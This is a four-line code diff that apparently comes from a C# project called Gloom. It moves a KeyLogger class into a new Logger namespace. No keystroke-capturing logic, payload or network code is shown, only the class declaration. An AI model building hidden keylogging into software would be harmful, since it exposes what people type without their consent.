@@ -1,4 +1,4 @@
-﻿namespace Gloom.Client.Features
+﻿namespace Gloom.Client.Features.Logger
 {
 	internal class KeyLogger : FeatureBase
 	{
